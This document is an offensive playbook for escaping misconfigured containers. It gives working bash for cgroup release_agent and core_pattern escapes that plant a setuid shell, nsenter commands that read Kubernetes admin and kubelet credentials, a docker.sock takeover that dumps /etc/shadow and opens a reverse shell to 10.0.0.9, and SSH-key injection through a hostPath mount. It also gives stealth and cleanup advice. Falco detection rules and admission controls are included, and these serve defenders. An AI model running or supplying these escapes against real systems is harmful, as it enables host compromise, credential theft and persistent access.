# Privileged & Misconfiguration Escapes

ATT&CK: T1611 (Escape to Host), T1610 (Deploy Container) · CWE-269 (Improper Privilege Management),
CWE-668 (Exposure of Resource to Wrong Sphere), CWE-22 (Path Traversal), CWE-250 (Execution with
Unnecessary Privileges).

These escapes need **no CVE** — they exploit how the container was *configured*. They remain the most
common real-world breakout path. The unifying root cause: containers share the host kernel; namespaces
and cgroups only *appear* to isolate. Give a container enough capability/mount/namespace access and the
shared kernel becomes a direct path to the host.

## Triage: what makes a container escapable

Run `scripts/escape_enum.sh` inside the target. Key signals:
- `--privileged` (all caps + unmasked `/sys`, `/proc`, devices) — `capsh --print`, `cat /proc/1/status | grep Cap`
- Dangerous caps: `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_DAC_READ_SEARCH`, `CAP_DAC_OVERRIDE`
- `hostPID: true` / shared PID ns — `ls -la /proc/1/exe` shows host init
- `hostNetwork: true` — host interfaces visible (`ip a`); can sniff/relay
- Mounted sockets: `/var/run/docker.sock`, `/run/containerd/containerd.sock`, `/var/run/crio/crio.sock`
- `hostPath` mounts (especially `/`, `/etc`, `/var/lib/kubelet`, `/proc`, `/dev`)
- Writable `/proc/sys/kernel/core_pattern`, mountable `cgroup`/`cgroup2`, available `mount` syscall

## 1. cgroup-v1 `release_agent` escape (CAP_SYS_ADMIN)

When the last task in a cgroup with `notify_on_release=1` exits, the host kernel runs the program in
`release_agent` **in the host init namespace as root**. With `CAP_SYS_ADMIN` + the `mount` syscall you
can mount a fresh cgroup hierarchy, set `release_agent` to a script on a host-visible path, and trigger
it. Full implementation in `scripts/release_agent_escape.sh`; core logic:
```bash
set -e
mkdir -p /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp 2>/dev/null || \
  mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir -p /tmp/cgrp/x && echo 1 > /tmp/cgrp/x/notify_on_release
# host path of THIS container's rootfs (overlay upperdir) as seen by the host kernel:
host_path=$(sed -n 's/.*\bupperdir=\([^,]*\).*/\1/p' /etc/mtab | head -n1)
echo "$host_path/cmd" > /tmp/cgrp/release_agent          # absolute HOST path
cat > /cmd <<'EOF'
#!/bin/sh
ps -ef > /output                                          # host process list -> visible in container
id >> /output
EOF
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"              # join+exit empty cgroup -> fires release_agent
sleep 1; cat /output
```
Note: cgroup-v1 only. Pure-cgroup-v2 hosts have no `release_agent` — use `core_pattern` or the runtime
CVEs instead. CVE-2022-0492 is the unprivileged variant (write `release_agent` without CAP_SYS_ADMIN
when running with no `cgroup` namespace and an unconfined profile) — historically important; most
modern kernels mount cgroup RO inside containers, so prefer the explicit-CAP_SYS_ADMIN flow above.

## 2. `core_pattern` host code execution

If `/proc/sys/kernel/core_pattern` is writable (privileged container, or via the runc-2025 procfs
mount primitive), set a pipe handler. On the next crash *anywhere*, the kernel pipes the core to your
program **as host root in the host namespace**:
```bash
test -w /proc/sys/kernel/core_pattern && \
printf '|/proc/%d/root/handler' "$(echo $$)" > /proc/sys/kernel/core_pattern   # %P-free pipe form
# simpler portable form: absolute host-visible path to a script
printf '|%s/handler' "$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /etc/mtab|head -1)" \
   > /proc/sys/kernel/core_pattern
cat > /handler <<'EOF'
#!/bin/sh
id > /core_escape; cp /bin/bash /tmp/bash; chmod +s /tmp/bash
EOF
chmod +x /handler
ulimit -c unlimited; sh -c 'kill -SIGSEGV $$'             # trigger
cat /core_escape
```
`scripts/release_agent_escape.sh -m core_pattern -c '<cmd>'` automates this variant.

## 3. `hostPID` + `nsenter` — join the host's namespaces

With `hostPID: true` (or sharing the host PID ns) and `CAP_SYS_ADMIN`/root, host PID 1 is reachable and
`nsenter` drops you straight into the host:
```bash
ls -la /proc/1/exe          # if this is the host's /sbin/init (not the container entrypoint), hostPID=true
nsenter --target 1 --mount --uts --ipc --net --pid -- bash   # full host shell
# read host secrets directly:
nsenter -t 1 -m -- cat /etc/kubernetes/admin.conf
nsenter -t 1 -m -- cat /var/lib/kubelet/pki/kubelet-client-current.pem
```
Even without hostPID, a privileged container can often see host processes via shared `/proc`; with
`CAP_SYS_PTRACE` you can inject into host processes.

## 4. Mounted container socket → host takeover

If `docker.sock`/`containerd.sock`/`crio.sock` is mounted, you control the runtime daemon (root on
host) and can spawn a privileged container that mounts host `/`:
```bash
# docker.sock: create+start a privileged container with host / bind-mounted, then chroot
curl -s --unix-socket /var/run/docker.sock -X POST http://d/containers/create \
  -H 'Content-Type: application/json' -d '{
    "Image":"alpine","Cmd":["chroot","/host","sh","-c","id; cat /etc/shadow > /host/tmp/out"],
    "HostConfig":{"Binds":["/:/host"],"Privileged":true}}' | tee /tmp/c.json
cid=$(sed -n 's/.*"Id":"\([0-9a-f]*\)".*/\1/p' /tmp/c.json)
curl -s --unix-socket /var/run/docker.sock -X POST "http://d/containers/$cid/start"
# Easier if the docker CLI is present:
docker -H unix:///var/run/docker.sock run -v /:/host --privileged --rm alpine \
  chroot /host sh -c 'id; bash -i >& /dev/tcp/10.0.0.9/443 0>&1'
```
For containerd/CRI-O use `crictl`/`ctr` against the socket: `ctr -a /run/containerd/containerd.sock
images pull docker.io/library/alpine:latest && ctr run --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw ... `.

## 5. `hostPath` `/` mount → write the host filesystem

A pod with a `hostPath` of `/` (or `/etc`, `/root`, `/var/lib/kubelet`) gives direct host fs R/W:
```yaml
volumes: [{ name: h, hostPath: { path: / } }]
volumeMounts: [{ name: h, mountPath: /host }]
```
```bash
chroot /host sh -c 'id'                                   # host root if uid0
echo 'ssh-ed25519 AAAA... atk' >> /host/root/.ssh/authorized_keys
cp /host/var/lib/kubelet/pki/kubelet-client-current.pem /tmp     # node identity for cluster pivot
```

## Detection

**Falco — the canonical container-escape rule pack covers all five:**
```yaml
- rule: Detect release_agent File Container Escapes
  condition: open_write and container and fd.name endswith "release_agent" and
             (user.uid=0 or thread.cap_effective contains CAP_SYS_ADMIN)
  output: "release_agent escape attempt (cmd=%proc.cmdline file=%fd.name cid=%container.id)"
  priority: CRITICAL
- rule: Write to core_pattern in Container
  condition: open_write and container and fd.name="/proc/sys/kernel/core_pattern"
  output: "core_pattern host-escape attempt (cmd=%proc.cmdline cid=%container.id)"
  priority: CRITICAL
- rule: nsenter into Host Namespace
  condition: spawned_process and container and proc.name=nsenter
  output: "nsenter container escape (cmd=%proc.cmdline cid=%container.id)"
  priority: CRITICAL
- rule: Docker/Containerd Socket Access by Unexpected Process
  condition: open_write and container and fd.name in
             ("/var/run/docker.sock","/run/containerd/containerd.sock","/var/run/crio/crio.sock")
  output: "Container runtime socket touched from container (cmd=%proc.cmdline cid=%container.id)"
  priority: WARNING
```

**Admission-time (prevent):** OPA/Gatekeeper or Pod Security Admission `restricted` blocks
`privileged`, `hostPID`/`hostNetwork`, `hostPath`, added caps, and socket mounts. **Detection IOCs:**
`mount -t cgroup`/`cgroup2` from a container; `release_agent`/`core_pattern` writes; `nsenter`/`unshare`
in a container; `curl --unix-socket .../docker.sock`; new `--privileged` container with `Binds":["/:..."`.

## OPSEC

- Touches: host kernel cgroup/proc state, mount table, runtime daemon events (a *new* container is
  created via the docker.sock path — very visible), and the host filesystem for anything you read/write.
- The `release_agent`/`core_pattern` writes are strong, well-signatured IOCs (Falco ships rules out of
  the box). Prefer `nsenter`/`hostPath` if those misconfigs already exist — they generate fewer novel
  events than mounting a new cgroup hierarchy.
- Cleanup: `umount /tmp/cgrp`; restore `core_pattern` to its prior value (save it first:
  `cat /proc/sys/kernel/core_pattern`); remove dropped `/cmd`,`/handler`,`/output`,`/core_escape`,
  setuid `/tmp/bash`; remove any container you created via the socket
  (`docker rm -f <cid>`); scrub injected `authorized_keys` / cron entries.
- The socket path leaves a runtime-level container-create event you cannot retract; use it only when
  stealth is not the priority or when you immediately move host-side and clean up the helper container.

## References

- HackTricks, "Docker release_agent cgroups escape" and "Docker Breakout / Privilege Escalation."
- Red Canary Threat Detection Report — "Escape to Host" (nsenter/hostPID, T1611).
- Falco default ruleset — `Detect release_agent File Container Escapes`, container-escape rules.
- Unit42 / CVE-2022-0492 (cgroups unprivileged release_agent) analysis; Kubernetes Pod Security Standards.
